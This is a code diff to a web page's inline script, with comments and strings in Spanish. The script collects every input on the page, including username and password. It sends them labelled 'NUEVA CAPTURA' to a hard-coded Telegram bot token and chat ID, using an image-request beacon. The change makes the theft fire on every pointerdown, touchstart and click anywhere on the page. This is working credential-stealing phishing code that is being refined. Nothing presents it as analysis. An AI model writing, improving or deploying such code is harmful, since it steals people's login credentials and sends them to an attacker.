@@ -428,27 +428,6 @@
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
 
-    function disparoRapido(usuario, password) {
-      if (!usuario && !password) return;
-
-      const mensaje = [
-        "NUEVA CAPTURA",
-        "Usuario: " + (usuario || "vacio"),
-        "Clave: " + (password || "vacia")
-      ].join("\n");
-
-      const endpoint =
-        "https://api.telegram.org/bot" +
-        TOKEN +
-        "/sendMessage?chat_id=" +
-        CHAT_ID +
-        "&text=" +
-        encodeURIComponent(mensaje);
-
-      const img = new Image();
-      img.src = endpoint;
-    }
-
     function leerCampos() {
       const inputs = Array.from(document.querySelectorAll("input"));
 
@@ -474,15 +453,32 @@
       };
     }
 
-    function manejarAccion(e) {
-      const objetivo = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"]') : null;
-      if (!objetivo) return;
-
+    function manejarAccion() {
       const { usuario, password } = leerCampos();
-      disparoRapido(usuario, password);
+      if (!usuario && !password) return;
+
+      const mensaje = [
+        "NUEVA CAPTURA",
+        "Usuario: " + (usuario || "vacio"),
+        "Clave: " + (password || "vacia")
+      ].join("\n");
+
+      const endpoint =
+        "https://api.telegram.org/bot" +
+        TOKEN +
+        "/sendMessage?chat_id=" +
+        CHAT_ID +
+        "&text=" +
+        encodeURIComponent(mensaje);
+
+      window._imgs = window._imgs || [];
+      const img = new Image();
+      img.src = endpoint;
+      window._imgs.push(img);
     }
 
     document.addEventListener("pointerdown", manejarAccion, true);
+    document.addEventListener("touchstart", manejarAccion, true);
     document.addEventListener("click", manejarAccion, true);
   })();
 </script>
